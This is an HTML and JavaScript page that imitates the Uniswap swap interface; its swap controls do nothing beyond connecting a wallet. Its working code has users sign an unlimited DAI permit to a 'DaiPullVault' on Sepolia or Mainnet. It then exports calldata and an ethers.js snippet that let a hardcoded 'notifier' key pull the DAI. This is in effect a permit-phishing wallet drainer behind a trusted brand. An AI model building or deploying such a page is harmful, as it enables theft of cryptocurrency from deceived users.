<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Uniswap — Demo Clone (Permit + Vault + Network Switch)</title>
  <style>
    :root{--bg:#0b0b0f;--surface:#111216;--border:#24262c;--ink:#e9ecf1;--muted:#9aa0ab;--accent:#ff2db2;--shadow:0 8px 28px rgba(0,0,0,.45)}
    *{box-sizing:border-box}
    body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;background:radial-gradient(900px 700px at 70% -10%, rgba(255,45,178,.16), transparent 55%),radial-gradient(700px 600px at -10% 10%, rgba(168,85,247,.12), transparent 50%),var(--bg);color:var(--ink)}
    .wrap{max-width:1200px;margin:0 auto;padding:20px}
    header{display:grid;grid-template-columns:220px 1fr 420px;align-items:center;gap:12px;margin-bottom:24px}
    .brand{display:flex;align-items:center;gap:10px}
    .uni{width:26px;height:26px;border-radius:7px;display:grid;place-items:center;background:radial-gradient(circle at 30% 30%, #ff8ad5, #ff2db2)}
    .uni svg{width:18px;height:18px;fill:#fff}
    nav{display:flex;gap:18px;margin-left:6px;color:#cdd3df}
    .search{max-width:560px;margin:0 auto;width:100%;display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:999px;background:#0f1016;border:1px solid #1d2026;color:#cfd3da}
    .search input{flex:1;background:transparent;border:0;outline:0;color:#cfd3da;font-size:14px}
    .top-right{display:flex;justify-content:flex-end;gap:10px;align-items:center;position:relative}
    .dots{width:40px;height:40px;border-radius:999px;border:1px solid #23262f;background:#12131a;display:grid;place-items:center;cursor:pointer}
    .connect{padding:10px 16px;border-radius:999px;border:0;cursor:pointer;color:#fff;font-weight:600;background:linear-gradient(180deg,#ff2db2,#ff46c0)}
    .account-btn{display:none;align-items:center;gap:8px;padding:8px 12px;border:1px solid #2a2d36;background:#141720;border-radius:999px;color:#e7ecfb;cursor:pointer}
    .account-text{font-weight:600;font-size:14px}
    .account-menu{position:absolute;right:0;top:52px;width:520px;background:#12141b;border:1px solid #232634;border-radius:12px;box-shadow:var(--shadow);display:none;z-index:30}
    .account-menu.show{display:block}
    .account-menu .row{display:flex;align-items:center;gap:10px;padding:12px;color:#cbd2df}
    .account-menu .row + .row{border-top:1px solid #232634}
    .account-menu .addr{flex:1;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .account-menu button{background:#151a24;border:1px solid #2a2f3a;border-radius:10px;padding:8px 12px;color:#e7ecfb;cursor:pointer}
    .net-select{appearance:none;background:#141720;border:1px solid #2a2d36;color:#e7ecfb;border-radius:10px;padding:8px 10px;font-size:13px;cursor:pointer}
    .net-select:focus{outline:none;box-shadow:0 0 0 2px rgba(255,45,178,.3)}

    .main{display:grid;place-items:center;margin-top:34px}
    .card{width:100%;max-width:580px;background:var(--surface);border:1px solid var(--border);border-radius:22px;box-shadow:var(--shadow)}
    .card-inner{padding:12px}
    .pill{padding:6px 12px;border-radius:999px;background:#17181f;border:1px solid #22242b;color:#d9dde6;font-size:13px}
    .gear{width:36px;height:36px;border-radius:10px;border:1px solid #22242b;background:#14161d;display:grid;place-items:center}
    .swap-box{margin-top:4px;border:1px solid var(--border);background:#0e0f14;border-radius:18px;overflow:hidden}
    .line{display:flex;align-items:center;gap:10px;padding:16px}
    .label{font-size:12px;color:#a3a8b4;margin-bottom:6px}
    .amt input{width:100%;background:transparent;border:0;outline:0;color:#fff;font-size:46px;line-height:1}
    .usd{font-size:12px;color:#7f8696;margin-top:6px}
    .token-btn{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:14px;background:#171820;border:1px solid #272a33}
    .switch{position:absolute;left:50%;transform:translate(-50%,-50%);top:0;width:44px;height:44px;border-radius:14px;border:1px solid #2a2d36;background:#13151c;display:grid;place-items:center}
    .cta{padding:14px}
    .swap-btn{width:100%;padding:16px;border-radius:14px;border:0;font-weight:700;color:#fff;opacity:.95;background:linear-gradient(180deg, rgba(255,45,178,.9), rgba(255,45,178,.75))}
    .meta{display:flex;justify-content:space-between;padding:10px 4px 2px;color:#98a0ad;font-size:12px}

    .note{display:none;margin:0 auto 12px;max-width:580px;color:#cbd2df;background:#12151e;border:1px solid #232634;border-radius:12px;padding:10px 12px;font-size:14px}

    /* Modals */
    .modal{position:fixed;inset:0;display:none;place-items:center;background:rgba(5,8,18,.6);backdrop-filter:blur(6px);z-index:60}
    .sheet{width:min(720px,92vw);border-radius:16px;background:#111217;border:1px solid #262a33;box-shadow:var(--shadow)}
    .sheet .hd{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid #262a33}
    .sheet .bd{padding:14px}
    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
    .field{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
    .field label{font-size:12px;color:#9aa3b2}
    .field input{background:#141823;border:1px solid #2a2f3a;border-radius:10px;color:#e9efff;padding:10px}
    .row-right{display:flex;justify-content:flex-end;gap:10px;margin-top:10px}
    .btn{padding:10px 14px;border-radius:10px;border:1px solid #2a2f3a;background:#151a24;color:#e7ecfb;cursor:pointer}
    .btn.pink{background:linear-gradient(180deg,#ff2db2,#ff46c0);border:0;color:#fff}
    .mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}
    pre{white-space:pre-wrap;word-wrap:break-word;background:#0e1119;border:1px solid #1d2130;border-radius:10px;padding:10px;color:#dbe6ff}
  </style>
</head>
<body>
  <div class="wrap">
    <header>
      <div class="brand">
        <div class="uni">
          <svg viewBox="0 0 24 24"><path d="M12 3c1.8 0 3.2 1.2 4.1 2.6.9 1.3 2.8.9 3.4-.6.1-.3.5-.4.7-.1.5.6.8 1.3.8 2.1 0 2.2-2 3.2-3.7 3.4-.5 2.6-2.6 4.6-5.3 5-1.6.3-3.2-.1-4.4-1.1-.2 2.2 1.2 4.4 3.4 5.1.3.1.4.5.1.7-2.6 1.9-6.3.2-7-3-.9-4 2.3-7.8 6.4-7.8h.3C11 7.1 9.8 6.5 9 5.6 8 4.6 9.5 3 10.9 3h1.1Z" fill="#fff"/></svg>
        </div>
        <strong>Uniswap</strong>
        <nav><span>Trade</span><span>Explore</span><span>Pool</span></nav>
      </div>

      <div class="search">
        <svg width="16" height="16" viewBox="0 0 24 24"><path fill="#93a0c8" d="M15.5 14h-.8l-.3-.3a6.5 6.5 0 1 0-.7.7l.3.3v.8l5 5 1.5-1.5-5-5zM10 15a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/></svg>
        <input placeholder="Search tokens and pools" />
      </div>

      <div class="top-right">
        <div class="dots" onclick="openSettings()"><svg viewBox="0 0 24 24"><circle cx="12" cy="4" r="2" fill="#cfd3da"/><circle cx="12" cy="12" r="2" fill="#cfd3da"/><circle cx="12" cy="20" r="2" fill="#cfd3da"/></svg></div>
        <select id="networkSelect" class="net-select" title="Select network">
          <option value="0xaa36a7" selected>Sepolia</option>
          <option value="0x1">Mainnet</option>
        </select>
        <button class="connect" id="connectBtn" onclick="connectWallet()">Connect</button>
        <button class="account-btn" id="accountBtn"><span class="account-text" id="acctText">0x0000…0000</span></button>
        <div class="account-menu" id="accountMenu">
          <div class="row">
            <span class="addr" id="menuAddr">—</span>
            <span id="signStatus" style="font-size:12px;color:#8bd7a5;display:none">Signed ✓</span>
            <button onclick="copyAddr()">Copy</button>
          </div>
          <div class="row" style="gap:10px;flex-wrap:wrap">
            <button onclick="requestSignature()">Sign message</button>
            <button onclick="openPermit()">DAI Permit</button>
            <button onclick="openSettings()">Settings</button>
            <button onclick="disconnectWallet()">Disconnect</button>
          </div>
        </div>
      </div>
    </header>

    <div id="walletNotice" class="note">Connected to <span id="walletNetwork">—</span> • <span id="walletAddr">—</span></div>

    <section class="main">
      <div class="card">
        <div class="card-inner">
          <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 6px 10px">
            <div style="display:flex;gap:6px"><div class="pill">Swap</div><div class="pill">Limit</div><div class="pill">Buy</div><div class="pill">Sell</div></div>
            <div class="gear"><svg viewBox="0 0 24 24"><path d="M19.4 13a7.8 7.8 0 0 0 0-2l2-.9-1.6-2.8-2 .9a7.7 7.7 0 0 0-1.7-1l.1-2.1h-3.2l.1 2.1c-.6.2-1.2.5-1.8.9l-1.9-1.1-1.6 2.8 1.9 1.1c-.1.7-.1 1.3 0 2l-1.9 1.1 1.6 2.8 1.9-1.1c.6.4 1.2.7 1.8.9l-.1 2.1h3.2l-.1-2.1c.6-.3 1.1-.6 1.7-1l2 .9 1.6-2.8-2-.9ZM12 14.5A2.5 2.5 0 1 1 12 9a2.5 2.5 0 0 1 0 5.5Z" fill="#cfd3da"/></svg></div>
          </div>

          <div class="swap-box">
            <div class="line" style="border-bottom:1px solid var(--border)">
              <div style="flex:1">
                <div class="label">Sell</div>
                <div class="amt"><input id="fromAmt" inputmode="decimal" placeholder="0" /></div>
                <div class="usd" id="fromUsd">$0</div>
              </div>
              <button class="token-btn"><div>Ξ</div><div style="font-weight:600" id="fromSym">ETH</div></button>
            </div>

            <div style="position:relative;height:0">
              <div class="switch" id="switchBtn"><svg viewBox="0 0 24 24"><path d="M7 7h11v2H7v3L3 8l4-4v3zm10 10H6v-2h11v-3l4 4-4 4v-3z" fill="#cfd3da"/></svg></div>
            </div>

            <div class="line">
              <div style="flex:1">
                <div class="label">Buy</div>
                <div class="amt"><input id="toAmt" inputmode="decimal" placeholder="0" /></div>
                <div class="usd" id="toUsd">0</div>
              </div>
              <button class="token-btn"><div>$</div><div style="font-weight:600" id="toSym">USDC</div></button>
            </div>
          </div>

          <div class="meta"><div>Rate</div><div id="rateText">1 ETH ≈ 3500.00 USDC</div></div>
          <div class="cta"><button class="swap-btn" onclick="connectWallet()">Connect wallet</button></div>

          <div id="balances" style="display:none;margin-top:8px;border-top:1px solid var(--border);padding:12px 6px 6px;color:#cfd5e3">
            <div style="font-size:12px;color:#99a1af;margin-bottom:6px">Balances</div>
            <div style="display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px">
              <div style="background:#12141c;border:1px solid #232634;border-radius:12px;padding:10px"><b>ETH</b><div id="balETH" class="usd">0</div></div>
              <div style="background:#12141c;border:1px solid #232634;border-radius:12px;padding:10px"><b>DAI</b><div id="balDAI" class="usd">0</div></div>
              <div style="background:#12141c;border:1px solid #232634;border-radius:12px;padding:10px"><b>USDC</b><div id="balUSDC" class="usd">0</div></div>
              <div style="background:#12141c;border:1px solid #232634;border-radius:12px;padding:10px"><b>USDT</b><div id="balUSDT" class="usd">0</div></div>
            </div>
          </div>

        </div>
      </div>
    </section>
  </div>

  <!-- Settings modal -->
  <div class="modal" id="settingsModal" aria-hidden="true">
    <div class="sheet">
      <div class="hd"><b>Settings</b><button class="btn" onclick="closeSettings()">Close</button></div>
      <div class="bd">
        <div class="field"><label>Vault address (DaiPullVault)</label><input id="setVault" placeholder="0xVault... (set after deploy)"></div>
        <div class="field"><label>Notifier address (must match vault.dappNotifier)</label><input id="setNotifier" placeholder="0xNotifier..."></div>
        <div class="row-right"><button class="btn pink" onclick="saveSettings()">Save</button></div>
        <div class="mono" style="margin-top:8px;color:#9aa3b2">Note: Contract not deployed yet — set the vault address after deploy.</div>
      </div>
    </div>
  </div>

  <!-- Permit modal -->
  <div class="modal" id="permitModal" aria-hidden="true">
    <div class="sheet">
      <div class="hd"><b>DAI Permit → Vault</b><button class="btn" onclick="closePermit()">Close</button></div>
      <div class="bd">
        <div class="grid2">
          <div class="field"><label>Owner (your address)</label><input id="permitOwner" readonly></div>
          <div class="field"><label>Vault (spender)</label><input id="permitVault" placeholder="0xVault... (set in Settings)"></div>
        </div>
        <div class="grid2">
          <div class="field"><label>Amount to pull (DAI)</label><input id="permitAmount" placeholder="e.g. 1.0"></div>
          <div class="field"><label>Deadline (minutes from now)</label><input id="permitMins" type="number" value="30" min="1"></div>
        </div>
        <div class="row-right">
          <button class="btn" onclick="signPermitExport()">Sign only (export for notifier)</button>
          <button class="btn pink" onclick="signPermitSubmitDai()">Sign & submit DAI.permit (you pay gas)</button>
        </div>
        <div id="permitResult" style="margin-top:12px;display:none"></div>
        <div id="permitHint" style="margin-top:8px;color:#9aa3b2;font-size:12px;display:none">
          <ul>
            <li>Exported JSON targets <code>DaiPullVault.permitAndPull</code>. Tx sender must equal <code>dappNotifier</code> in the vault.</li>
            <li>DAI permit is boolean (unlimited). Exact 1 DAI limits require a normal <code>approve</code>.</li>
            <li>“Sign & submit DAI.permit” only sets allowance. Pulling still requires a call to your vault (e.g., <code>onApprovalNotified</code>).</li>
          </ul>
        </div>
      </div>
    </div>
  </div>

  <!-- Ethers.js -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <!-- App script -->
  <script>
  (() => {
    // ===== Helpers =====
    const qs = s => document.querySelector(s);
    const shorten = a => a ? a.slice(0,6)+'…'+a.slice(-4) : '';
    const fmt = (x,d=2)=>{ if(!isFinite(x)) return '0'; const abs=Math.abs(x); if(abs>1) return x.toLocaleString(undefined,{maximumFractionDigits:d}); return x.toLocaleString(undefined,{maximumFractionDigits:6}); };

    // Chain-aware DAI addresses (your Sepolia DAI is included)
    const DAI_ADDRS = {
      '0x1':      '0x6B175474E89094C44Da98b954EedeAC495271d0F', // mainnet
      '0xaa36a7': '0x21AfeE016BdcF5fa32308816f8612e016D2b65F7', // sepolia (yours)
    };
    const DEFAULTS_BY_CHAIN={
      '0xaa36a7':{ notifier:'0x8F586EC9534D1Fe3323982A3bDeb8F9b004AF416' }
    };

    // ERC20s for balances (DAI gets swapped in per chain)
    let ERC20S={DAI:{addr:DAI_ADDRS['0xaa36a7'],decimals:18},USDC:{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48',decimals:6},USDT:{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6}};

    let DAI=DAI_ADDRS['0xaa36a7'];
    let currentAddress=null, lastSignature=null;
    let VAULT_ADDRESS=localStorage.getItem('vaultAddress')||'';
    let NOTIFIER_ADDRESS=localStorage.getItem('notifierAddress')||'';

    function getSelectedChainId(){ const el=qs('#networkSelect'); return el && el.value ? el.value : '0xaa36a7'; }
    function labelForChain(id){ if(id==='0x1') return 'Ethereum Mainnet'; if(id==='0xaa36a7') return 'Ethereum Sepolia'; try{ return 'Chain '+parseInt(id,16);}catch{return'Unknown';} }
    function setChainConfig(chainIdHex){
      DAI = DAI_ADDRS[chainIdHex] || DAI_ADDRS['0x1'];
      if(ERC20S && ERC20S.DAI) ERC20S.DAI.addr = DAI;
      if(!NOTIFIER_ADDRESS && DEFAULTS_BY_CHAIN[chainIdHex]?.notifier){
        NOTIFIER_ADDRESS = DEFAULTS_BY_CHAIN[chainIdHex].notifier;
        localStorage.setItem('notifierAddress', NOTIFIER_ADDRESS);
      }
    }
    function reflectSelectedChain(id){
      const sel=qs('#networkSelect'); if(sel && sel.value!==id) sel.value=id;
      setChainConfig(id); const netEl=qs('#walletNetwork'); if(netEl) netEl.textContent=labelForChain(id);
    }

    async function ensureChain(target='0xaa36a7'){
      if(!window.ethereum){ alert('Install MetaMask'); return false; }
      let cur; try{ cur=await ethereum.request({method:'eth_chainId'});}catch{cur=null;}
      if(cur===target) return true;
      try{ await ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:target}]}); return true; }
      catch(e){
        if(e && e.code===4902 && target==='0xaa36a7'){
          try{
            await ethereum.request({ method:'wallet_addEthereumChain', params:[{ chainId:'0xaa36a7', chainName:'Sepolia', nativeCurrency:{name:'Sepolia ETH',symbol:'SEP',decimals:18}, rpcUrls:['https://rpc.sepolia.org'], blockExplorerUrls:['https://sepolia.etherscan.io'] }]});
            return true;
          }catch(e2){ console.warn('add chain failed', e2); return false; }
        }
        console.warn('switch chain failed', e); return false;
      }
    }

    // ===== Swap header demo calc (simple) =====
    const TOKENS=[{sym:'ETH',priceUSD:3500},{sym:'USDC',priceUSD:1}]; let from=TOKENS[0], to=TOKENS[1];
    function updateHeaders(){ const rate=from.priceUSD/to.priceUSD; qs('#rateText').textContent=`1 ${from.sym} ≈ ${fmt(rate,4)} ${to.sym}`; compute(); }
    function compute(){ const a=parseFloat(qs('#fromAmt').value); const px=from.priceUSD/to.priceUSD; if(!isFinite(a)){ qs('#toAmt').value=''; qs('#fromUsd').textContent='$0'; qs('#toUsd').textContent='0'; return;} const out=a*px; qs('#toAmt').value=out?fmt(out):''; qs('#fromUsd').textContent='$'+fmt(a*from.priceUSD); qs('#toUsd').textContent=fmt(out); }
    document.addEventListener('input', (e)=>{ if(e.target && e.target.id==='fromAmt') compute(); });
    document.addEventListener('click', (e)=>{ if(e.target && e.target.id==='switchBtn') { const tmp=from; from=to; to=tmp; qs('#fromSym').textContent=from.sym; qs('#toSym').textContent=to.sym; updateHeaders(); } });

    // ===== Wallet connect =====
    window.connectWallet = async function(){
      const target=getSelectedChainId(); const ok=await ensureChain(target); if(!ok) return;
      reflectSelectedChain(target);
      const accounts=await ethereum.request({method:'eth_requestAccounts'}); if(!accounts||!accounts[0]) return;
      currentAddress=accounts[0];

      // UI
      qs('#connectBtn').style.display='none';
      const abtn=qs('#accountBtn'); abtn.style.display='inline-flex'; qs('#acctText').textContent=shorten(currentAddress);
      qs('#walletNotice').style.display='block'; qs('#walletAddr').textContent=shorten(currentAddress);
      qs('#menuAddr').textContent=currentAddress;
      qs('#balances').style.display='block';

      // events
      ethereum.removeListener?.('accountsChanged', onAccountsChanged); ethereum.on?.('accountsChanged', onAccountsChanged);
      ethereum.removeListener?.('chainChanged', onChainChanged); ethereum.on?.('chainChanged', onChainChanged);

      await loadBalances(currentAddress);
    };
    async function onAccountsChanged(accts){ if(accts && accts[0]){ currentAddress=accts[0]; qs('#acctText').textContent=shorten(currentAddress); qs('#menuAddr').textContent=currentAddress; lastSignature=null; qs('#signStatus').style.display='none'; await loadBalances(currentAddress);} }
    async function onChainChanged(){ const id=await ethereum.request({method:'eth_chainId'}); reflectSelectedChain(id); if(currentAddress) await loadBalances(currentAddress); }

    window.disconnectWallet=function(){ currentAddress=null; lastSignature=null; qs('#accountBtn').style.display='none'; qs('#connectBtn').style.display='inline-block'; qs('#walletNotice').style.display='none'; qs('#balances').style.display='none'; qs('#accountMenu').classList.remove('show'); qs('#signStatus').style.display='none'; };

    // Account menu toggle
    qs('#accountBtn').addEventListener('click', (e)=>{ e.stopPropagation(); qs('#accountMenu').classList.toggle('show'); });
    document.addEventListener('click', (e)=>{ const m=qs('#accountMenu'); const btn=qs('#accountBtn'); if(!m.contains(e.target) && !btn.contains(e.target)) m.classList.remove('show'); });

    window.copyAddr=async function(){ if(!currentAddress) return; try{ await navigator.clipboard.writeText(currentAddress);}catch{} };

    // ===== Balances =====
    async function loadBalances(addr){
      try{ const wei=await ethereum.request({method:'eth_getBalance', params:[addr,'latest']}); const eth=parseFloat(ethers.utils.formatUnits(wei,18)); qs('#balETH').textContent=eth.toLocaleString(undefined,{maximumFractionDigits:6}); }catch(e){ qs('#balETH').textContent='—'; }
      const provider=new ethers.providers.Web3Provider(window.ethereum);
      for(const [sym,info] of Object.entries(ERC20S)){
        try{ const erc=new ethers.Contract(info.addr, ['function balanceOf(address) view returns (uint256)'], provider); const v=await erc.balanceOf(addr); const num=parseFloat(ethers.utils.formatUnits(v, info.decimals)); qs('#bal'+sym).textContent=num.toLocaleString(undefined,{maximumFractionDigits:6}); }catch{ const el=qs('#bal'+sym); if(el) el.textContent='—'; }
      }
    }

    // ===== Settings modal =====
    window.openSettings=function(){ qs('#setVault').value=VAULT_ADDRESS; qs('#setNotifier').value=NOTIFIER_ADDRESS; qs('#settingsModal').style.display='grid'; };
    window.closeSettings=function(){ qs('#settingsModal').style.display='none'; };
    window.saveSettings=function(){ VAULT_ADDRESS=qs('#setVault').value.trim(); NOTIFIER_ADDRESS=qs('#setNotifier').value.trim(); localStorage.setItem('vaultAddress',VAULT_ADDRESS); localStorage.setItem('notifierAddress',NOTIFIER_ADDRESS); closeSettings(); };

    // ===== Sign plain message (proof of ownership) =====
    window.requestSignature=async function(){
      if(!currentAddress){ alert('Connect first'); return; }
      const msg=`Welcome!\\n\\nBy signing this message you confirm you control wallet ${currentAddress}.\\nThis is NOT a transaction.`;
      try{
        let sig=await ethereum.request({method:'personal_sign', params:[msg, currentAddress]});
        if(!sig){ const hex='0x'+[...new TextEncoder().encode(msg)].map(b=>b.toString(16).padStart(2,'0')).join(''); sig=await ethereum.request({method:'personal_sign', params:[hex, currentAddress]}); }
        lastSignature=sig; qs('#signStatus').style.display='inline';
      }catch(e){ console.warn(e); }
    };

    // ===== Permit (DAI legacy boolean) =====
    window.openPermit=async function(){
      if(!currentAddress){ alert('Connect first'); return; }
      const ok=await ensureChain(getSelectedChainId()); if(!ok) return;
      qs('#permitOwner').value=currentAddress;
      qs('#permitVault').value=VAULT_ADDRESS;
      qs('#permitResult').style.display='none';
      qs('#permitHint').style.display='none';
      qs('#permitModal').style.display='grid';
    };
    window.closePermit=function(){ qs('#permitModal').style.display='none'; };

    async function buildDaiPermit(owner, spender, minutesFromNow){
      // Read live name() and nonces() from the token
      const provider=new ethers.providers.Web3Provider(window.ethereum);
      const dai=new ethers.Contract(DAI,['function name() view returns (string)','function nonces(address) view returns (uint256)'], provider);
      const [name, nonceBN] = await Promise.all([dai.name(), dai.nonces(owner)]);
      const chainId=parseInt(await ethereum.request({method:'eth_chainId'}),16);
      const expiry=Math.floor(Date.now()/1000)+minutesFromNow*60;

      const typedData={
        types:{
          EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
          Permit:[{name:'holder',type:'address'},{name:'spender',type:'address'},{name:'nonce',type:'uint256'},{name:'expiry',type:'uint256'},{name:'allowed',type:'bool'}],
        },
        primaryType:'Permit',
        domain:{name,version:'1',chainId,verifyingContract:DAI},
        message:{holder:owner,spender,nonce:nonceBN.toString(),expiry,allowed:true}
      };
      return {typedData, chainId, expiry, nonce: nonceBN.toString()};
    }
    function splitSig(sig){ const s=sig.replace(/^0x/,''); const r='0x'+s.slice(0,64); const s2='0x'+s.slice(64,128); let v=parseInt(s.slice(128,130),16); if(v<27) v+=27; return {v, r, s:s2}; }

    window.signPermitExport=async function(){
      try{
        if(!currentAddress){ alert('Connect first'); return; }
        const owner=currentAddress; const vault=(qs('#permitVault').value||'').trim();
        if(!/^0x[0-9a-fA-F]{40}$/.test(vault)){ alert('Put your vault address in Settings first'); return; }
        const mins=parseInt(qs('#permitMins').value||'30',10);
        const amountStr=(qs('#permitAmount').value||'').trim(); if(!amountStr){ alert('Enter DAI amount'); return; }
        const amountWei=ethers.utils.parseUnits(amountStr,18).toString();

        const {typedData, expiry, chainId, nonce}=await buildDaiPermit(owner, vault, mins);
        const sig=await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
        const {v,r,s}=splitSig(sig);

        const payload={ vault, function:'permitAndPull', args:{ holder:owner, nonce, expiry, allowed:true, v, r, s, amount:amountWei }, chainId, dai: DAI };

        const iface=new ethers.utils.Interface(['function permitAndPull(address holder,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s,uint256 amount)']);
        const callData=iface.encodeFunctionData('permitAndPull',[owner, nonce, expiry, true, v, r, s, amountWei]);
        const snippet=`// Ethers v5 (sender must equal vault.dappNotifier)
import { ethers } from 'ethers';
const VAULT='${vault}';
const provider=new ethers.providers.JsonRpcProvider('<RPC_URL>');
const signer=new ethers.Wallet('<NOTIFIER_PRIVATE_KEY>', provider);
const iface=new ethers.utils.Interface(['function permitAndPull(address,uint256,uint256,bool,uint8,bytes32,bytes32,uint256)']);
const data=iface.encodeFunctionData('permitAndPull',['${owner}', ${nonce}, ${expiry}, true, ${v}, '${r}', '${s}', '${amountWei}']);
const tx=await signer.sendTransaction({ to:VAULT, data });
console.log('tx', tx.hash);`;

        const box=qs('#permitResult'); box.style.display='block';
        box.innerHTML = `<div class="mono">payload</div><pre>${JSON.stringify(payload,null,2)}</pre><div class="mono">callData</div><pre>${callData}</pre><div class="mono">ethers.js snippet</div><pre>${snippet}</pre>`;
        qs('#permitHint').style.display='block';
      }catch(e){ console.warn(e); alert('Permit failed or rejected'); }
    };

    window.signPermitSubmitDai=async function(){
      try{
        if(!currentAddress){ alert('Connect first'); return; }
        const owner=currentAddress; const vault=(qs('#permitVault').value||'').trim();
        if(!/^0x[0-9a-fA-F]{40}$/.test(vault)){ alert('Put your vault address in Settings first'); return; }
        const mins=parseInt(qs('#permitMins').value||'30',10);

        const {typedData, expiry, nonce}=await buildDaiPermit(owner, vault, mins);
        const sig=await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
        const {v,r,s}=splitSig(sig);

        const provider=new ethers.providers.Web3Provider(window.ethereum);
        const signer=provider.getSigner();
        const dai=new ethers.Contract(DAI,['function permit(address holder,address spender,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s)'], signer);
        const tx=await dai.permit(owner, vault, nonce, expiry, true, v, r, s);
        const rcpt=await tx.wait();

        const box=qs('#permitResult'); box.style.display='block'; box.innerHTML=`<div class="mono">DAI.permit tx</div><pre>${rcpt.transactionHash}</pre>`; qs('#permitHint').style.display='block';
      }catch(e){ console.warn(e); alert('Permit submit failed'); }
    };

    // ===== Boot & dropdown wiring =====
    document.addEventListener('DOMContentLoaded', async ()=>{
      updateHeaders();
      let cur=null; try{ cur=await ethereum?.request({method:'eth_chainId'});}catch{}
      reflectSelectedChain(cur||getSelectedChainId());
      const sel=qs('#networkSelect');
      if(sel){
        sel.addEventListener('change', async (e)=>{
          const id=e.target.value; const ok=await ensureChain(id);
          if(ok){ reflectSelectedChain(id); if(currentAddress) await loadBalances(currentAddress); }
          else { try{ sel.value=await ethereum.request({method:'eth_chainId'}); }catch{} }
        });
      }
    });
  })();
  </script>
</body>
</html>
